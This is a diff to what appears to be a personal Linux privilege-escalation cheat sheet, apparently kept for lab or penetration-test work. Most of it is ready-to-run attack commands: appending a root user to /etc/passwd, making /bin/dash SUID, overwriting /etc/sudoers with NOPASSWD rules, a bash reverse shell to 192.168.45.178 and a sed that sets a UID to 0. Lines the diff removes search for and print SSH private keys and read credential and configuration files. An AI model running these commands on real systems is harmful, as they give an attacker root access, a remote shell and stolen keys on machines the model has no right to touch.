@@ -12,8 +12,9 @@ stty raw -echo ; fg ; reset
 stty columns 200 rows 200
 
 /dev/shm/shell80&
-./flare.sh
-./pspy
+./flare.sh # Checks for the files you're looking for
+./pspy -pf
+./linpeas.sh
 
 # Basic
 id ; env ; hostname ; /etc/issue ; /etc/os-release ; uname -a ;
@@ -58,40 +59,19 @@ ll /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 mysql --version
 
 # One-shot payloads injects
-echo "hehe:$(openssl passwd LuLZ):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
+echo "hehe:$(openssl passwd LuLZ):0:0:root:/root:/bin/bash" >> /etc/passwd
 chmod 4777 /bin/dash ; /bin/dash -p
-echo “apache ALL=(root) NOPASSWD: ALL” > /etc/sudoers
+echo 'profiler ALL=(root) NOPASSWD: ALL' > /etc/sudoers
 bash -i >& /dev/tcp/192.168.45.178/80 0>&1
 sed -i s/1001/0/g /etc/passwd
 
 # File enumeration
 grep "CRON" /var/log/syslog
 
-# Apache
-cat /var/log/apache/access.log /var/log/apache/error.log /var/log/apache2/access.log /var/log/apache2/error.log
-/etc/apache2/.htpasswd /etc/apache2/ports.conf /etc/apache2/sites-enabled/domain.conf /etc/apache2/sites-available/domain.conf /etc/apache2/sites-available/000-default.conf /usr/local/apache2/conf/httpd.conf -al /usr/local/apache2/htdocs/
-
-# Nginx
-/usr/local
-
-cat /var/log/nginx/access.log /var/log/nginx/error.log /etc/nginx/nginx.conf /etc/nginx/conf.d/.htpasswd /etc/nginx/sites-available/example.com.conf /etc/nginx/sites-enabled/example.com.conf /usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.conf
-
-# PHP web conf
-cat /etc/php/*\.*/apache2/php.ini /etc/php/*\.*/cli/php.ini /etc/php/*\.*/fpm/php.ini
-
-# MySQL (MariaDB)
-cat /etc/mysql/my.cnf /etc/mysql/debian.cnf /etc/mysql/mariadb.cnf /etc/mysql/conf.d/mysql.cnf /etc/mysql/
-
-# SSH keys
-ll /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa
-
 # Modified in last 10 minutes
 find / -type f -mmin -10 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -printf '%T+ %p\n' 2>/dev/null | head -100 | sort -r
-
-
 
 # What's been modified after..
 touch -t 202401031231.43 /tmp/wotsit
 find / -newer /tmp/wotsit -print 2>/dev/null
-
 ```
